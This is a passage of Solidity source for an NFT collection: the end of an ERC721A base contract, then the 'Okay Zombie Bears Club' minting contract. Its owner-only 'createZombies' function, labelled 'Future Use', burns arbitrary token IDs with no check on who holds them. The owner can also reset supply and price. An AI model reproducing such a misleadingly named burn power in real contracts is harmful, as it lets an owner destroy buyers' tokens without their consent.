1020         emit ApprovalForAll(_msgSender(), operator, approved);
1021     }
1022 
1023     /**
1024      * @dev See {IERC721-isApprovedForAll}.
1025      */
1026     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1027         return _operatorApprovals[owner][operator];
1028     }
1029 
1030     /**
1031      * @dev See {IERC721-transferFrom}.
1032      */
1033     function transferFrom(
1034         address from,
1035         address to,
1036         uint256 tokenId
1037     ) public virtual override {
1038         _transfer(from, to, tokenId);
1039     }
1040 
1041     /**
1042      * @dev See {IERC721-safeTransferFrom}.
1043      */
1044     function safeTransferFrom(
1045         address from,
1046         address to,
1047         uint256 tokenId
1048     ) public virtual override {
1049         safeTransferFrom(from, to, tokenId, '');
1050     }
1051 
1052     /**
1053      * @dev See {IERC721-safeTransferFrom}.
1054      */
1055     function safeTransferFrom(
1056         address from,
1057         address to,
1058         uint256 tokenId,
1059         bytes memory _data
1060     ) public virtual override {
1061         _transfer(from, to, tokenId);
1062         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1063             revert TransferToNonERC721ReceiverImplementer();
1064         }
1065     }
1066 
1067     /**
1068      * @dev Returns whether `tokenId` exists.
1069      *
1070      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1071      *
1072      * Tokens start existing when they are minted (`_mint`),
1073      */
1074     function _exists(uint256 tokenId) internal view returns (bool) {
1075         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1076             !_ownerships[tokenId].burned;
1077     }
1078 
1079     function _safeMint(address to, uint256 quantity) internal {
1080         _safeMint(to, quantity, '');
1081     }
1082 
1083     /**
1084      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1085      *
1086      * Requirements:
1087      *
1088      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1089      * - `quantity` must be greater than 0.
1090      *
1091      * Emits a {Transfer} event.
1092      */
1093     function _safeMint(
1094         address to,
1095         uint256 quantity,
1096         bytes memory _data
1097     ) internal {
1098         _mint(to, quantity, _data, true);
1099     }
1100 
1101     /**
1102      * @dev Mints `quantity` tokens and transfers them to `to`.
1103      *
1104      * Requirements:
1105      *
1106      * - `to` cannot be the zero address.
1107      * - `quantity` must be greater than 0.
1108      *
1109      * Emits a {Transfer} event.
1110      */
1111     function _mint(
1112         address to,
1113         uint256 quantity,
1114         bytes memory _data,
1115         bool safe
1116     ) internal {
1117         uint256 startTokenId = _currentIndex;
1118         if (to == address(0)) revert MintToZeroAddress();
1119         if (quantity == 0) revert MintZeroQuantity();
1120 
1121         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1122 
1123         // Overflows are incredibly unrealistic.
1124         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1125         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1126         unchecked {
1127             _addressData[to].balance += uint64(quantity);
1128             _addressData[to].numberMinted += uint64(quantity);
1129 
1130             _ownerships[startTokenId].addr = to;
1131             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1132 
1133             uint256 updatedIndex = startTokenId;
1134             uint256 end = updatedIndex + quantity;
1135 
1136             if (safe && to.isContract()) {
1137                 do {
1138                     emit Transfer(address(0), to, updatedIndex);
1139                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1140                         revert TransferToNonERC721ReceiverImplementer();
1141                     }
1142                 } while (updatedIndex != end);
1143                 // Reentrancy protection
1144                 if (_currentIndex != startTokenId) revert();
1145             } else {
1146                 do {
1147                     emit Transfer(address(0), to, updatedIndex++);
1148                 } while (updatedIndex != end);
1149             }
1150             _currentIndex = updatedIndex;
1151         }
1152         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1153     }
1154 
1155     /**
1156      * @dev Transfers `tokenId` from `from` to `to`.
1157      *
1158      * Requirements:
1159      *
1160      * - `to` cannot be the zero address.
1161      * - `tokenId` token must be owned by `from`.
1162      *
1163      * Emits a {Transfer} event.
1164      */
1165     function _transfer(
1166         address from,
1167         address to,
1168         uint256 tokenId
1169     ) private {
1170         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1171 
1172         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1173             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1174             getApproved(tokenId) == _msgSender());
1175 
1176         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1177         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1178         if (to == address(0)) revert TransferToZeroAddress();
1179 
1180         _beforeTokenTransfers(from, to, tokenId, 1);
1181 
1182         // Clear approvals from the previous owner
1183         _approve(address(0), tokenId, prevOwnership.addr);
1184 
1185         // Underflow of the sender's balance is impossible because we check for
1186         // ownership above and the recipient's balance can't realistically overflow.
1187         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1188         unchecked {
1189             _addressData[from].balance -= 1;
1190             _addressData[to].balance += 1;
1191 
1192             _ownerships[tokenId].addr = to;
1193             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1194 
1195             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1196             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1197             uint256 nextTokenId = tokenId + 1;
1198             if (_ownerships[nextTokenId].addr == address(0)) {
1199                 // This will suffice for checking _exists(nextTokenId),
1200                 // as a burned slot cannot contain the zero address.
1201                 if (nextTokenId < _currentIndex) {
1202                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1203                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1204                 }
1205             }
1206         }
1207 
1208         emit Transfer(from, to, tokenId);
1209         _afterTokenTransfers(from, to, tokenId, 1);
1210     }
1211 
1212     /**
1213      * @dev Destroys `tokenId`.
1214      * The approval is cleared when the token is burned.
1215      *
1216      * Requirements:
1217      *
1218      * - `tokenId` must exist.
1219      *
1220      * Emits a {Transfer} event.
1221      */
1222     function _burn(uint256 tokenId) internal virtual {
1223         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1224 
1225         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1226 
1227         // Clear approvals from the previous owner
1228         _approve(address(0), tokenId, prevOwnership.addr);
1229 
1230         // Underflow of the sender's balance is impossible because we check for
1231         // ownership above and the recipient's balance can't realistically overflow.
1232         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1233         unchecked {
1234             _addressData[prevOwnership.addr].balance -= 1;
1235             _addressData[prevOwnership.addr].numberBurned += 1;
1236 
1237             // Keep track of who burned the token, and the timestamp of burning.
1238             _ownerships[tokenId].addr = prevOwnership.addr;
1239             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1240             _ownerships[tokenId].burned = true;
1241 
1242             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1243             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1244             uint256 nextTokenId = tokenId + 1;
1245             if (_ownerships[nextTokenId].addr == address(0)) {
1246                 // This will suffice for checking _exists(nextTokenId),
1247                 // as a burned slot cannot contain the zero address.
1248                 if (nextTokenId < _currentIndex) {
1249                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1250                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1251                 }
1252             }
1253         }
1254 
1255         emit Transfer(prevOwnership.addr, address(0), tokenId);
1256         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1257 
1258         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1259         unchecked {
1260             _burnCounter++;
1261         }
1262     }
1263 
1264     /**
1265      * @dev Approve `to` to operate on `tokenId`
1266      *
1267      * Emits a {Approval} event.
1268      */
1269     function _approve(
1270         address to,
1271         uint256 tokenId,
1272         address owner
1273     ) private {
1274         _tokenApprovals[tokenId] = to;
1275         emit Approval(owner, to, tokenId);
1276     }
1277 
1278     /**
1279      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1280      *
1281      * @param from address representing the previous owner of the given token ID
1282      * @param to target address that will receive the tokens
1283      * @param tokenId uint256 ID of the token to be transferred
1284      * @param _data bytes optional data to send along with the call
1285      * @return bool whether the call correctly returned the expected magic value
1286      */
1287     function _checkContractOnERC721Received(
1288         address from,
1289         address to,
1290         uint256 tokenId,
1291         bytes memory _data
1292     ) private returns (bool) {
1293         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1294             return retval == IERC721Receiver(to).onERC721Received.selector;
1295         } catch (bytes memory reason) {
1296             if (reason.length == 0) {
1297                 revert TransferToNonERC721ReceiverImplementer();
1298             } else {
1299                 assembly {
1300                     revert(add(32, reason), mload(reason))
1301                 }
1302             }
1303         }
1304     }
1305 
1306     /**
1307      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1308      * And also called before burning one token.
1309      *
1310      * startTokenId - the first token id to be transferred
1311      * quantity - the amount to be transferred
1312      *
1313      * Calling conditions:
1314      *
1315      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1316      * transferred to `to`.
1317      * - When `from` is zero, `tokenId` will be minted for `to`.
1318      * - When `to` is zero, `tokenId` will be burned by `from`.
1319      * - `from` and `to` are never both zero.
1320      */
1321     function _beforeTokenTransfers(
1322         address from,
1323         address to,
1324         uint256 startTokenId,
1325         uint256 quantity
1326     ) internal virtual {}
1327 
1328     /**
1329      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1330      * minting.
1331      * And also called after one token has been burned.
1332      *
1333      * startTokenId - the first token id to be transferred
1334      * quantity - the amount to be transferred
1335      *
1336      * Calling conditions:
1337      *
1338      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1339      * transferred to `to`.
1340      * - When `from` is zero, `tokenId` has been minted for `to`.
1341      * - When `to` is zero, `tokenId` has been burned by `from`.
1342      * - `from` and `to` are never both zero.
1343      */
1344     function _afterTokenTransfers(
1345         address from,
1346         address to,
1347         uint256 startTokenId,
1348         uint256 quantity
1349     ) internal virtual {}
1350 }
1351 
1352 
1353 
1354 contract OkayZombieBearsClub is ERC721A, Owneable {
1355 
1356     string public baseURI = "ipfs:///";
1357     string public contractURI = "ipfs://";
1358     string public baseExtension = ".json";
1359     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1360 
1361     uint256 public MAX_PER_TX_FREE = 5;
1362     uint256 public free_max_supply = 4444;
1363     uint256 public constant MAX_PER_TX = 10;
1364     uint256 public max_supply = 9999;
1365     uint256 public price = 0.0005666 ether;
1366 
1367     bool public paused = true;
1368 
1369     constructor() ERC721A("Okay Zombie Bears Club", "ZOMBIES") {}
1370 
1371     function PublicMint(uint256 _amount) external payable {
1372         address _caller = _msgSender();
1373         require(!paused, "Paused");
1374         require(max_supply >= totalSupply() + _amount, "Zombie Sayz No MOAR");
1375         require(_amount > 0, "No 0 mints");
1376         require(tx.origin == _caller, "Zombies Eat Contracts");
1377         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1378         
1379       if(free_max_supply >= totalSupply()){
1380             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1381         }else{
1382             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1383             require(_amount * price == msg.value, "Invalid funds provided");
1384         }
1385 
1386 
1387         _safeMint(_caller, _amount);
1388     }
1389 
1390 
1391 
1392 
1393   
1394 
1395     function isApprovedForAll(address owner, address operator)
1396         override
1397         public
1398         view
1399         returns (bool)
1400     {
1401         // Whitelist OpenSea proxy contract for easy trading.
1402         //badpie = king?
1403         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1404         if (address(proxyRegistry.proxies(owner)) == operator) {
1405             return true;
1406         }
1407 
1408         return super.isApprovedForAll(owner, operator);
1409     }
1410 
1411     function Withdraw() external onlyOwner {
1412         uint256 balance = address(this).balance;
1413         (bool success, ) = _msgSender().call{value: balance}("");
1414         require(success, "Failed to send");
1415     }
1416 
1417     function TeamMint(uint256 quantity) external onlyOwner {
1418         _safeMint(_msgSender(), quantity);
1419     }
1420 
1421 
1422     function pause(bool _state) external onlyOwner {
1423         paused = _state;
1424     }
1425 
1426     function setBaseURI(string memory baseURI_) external onlyOwner {
1427         baseURI = baseURI_;
1428     }
1429 
1430     function setContractURI(string memory _contractURI) external onlyOwner {
1431         contractURI = _contractURI;
1432     }
1433 
1434     function configPrice(uint256 newPrice) public onlyOwner {
1435         price = newPrice;
1436     }
1437 
1438 
1439      function configMAX_PER_TX_FREE(uint256 newFREE) public onlyOwner {
1440         MAX_PER_TX_FREE = newFREE;
1441     }
1442 
1443     function configmax_supply(uint256 newSupply) public onlyOwner {
1444         max_supply = newSupply;
1445     }
1446 
1447     function configfree_max_supply(uint256 newFreesupply) public onlyOwner {
1448         free_max_supply = newFreesupply;
1449     }
1450     function newbaseExtension(string memory newex) public onlyOwner {
1451         baseExtension = newex;
1452     }
1453 
1454 
1455 //Future Use
1456         function createZombies(uint256[] memory tokenids) external onlyOwner {
1457         uint256 len = tokenids.length;
1458         for (uint256 i; i < len; i++) {
1459             uint256 tokenid = tokenids[i];
1460             _burn(tokenid);
1461         }
1462     }
1463 
1464 
1465     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1466         require(_exists(_tokenId), "Token does not exist.");
1467         return bytes(baseURI).length > 0 ? string(
1468             abi.encodePacked(
1469               baseURI,
1470               Strings.toString(_tokenId),
1471               baseExtension
1472             )
1473         ) : "";
1474     }
1475 }
1476 
1477 contract OwnableDelegateProxy { }
1478 contract ProxyRegistry {
1479     mapping(address => OwnableDelegateProxy) public proxies;
1480 }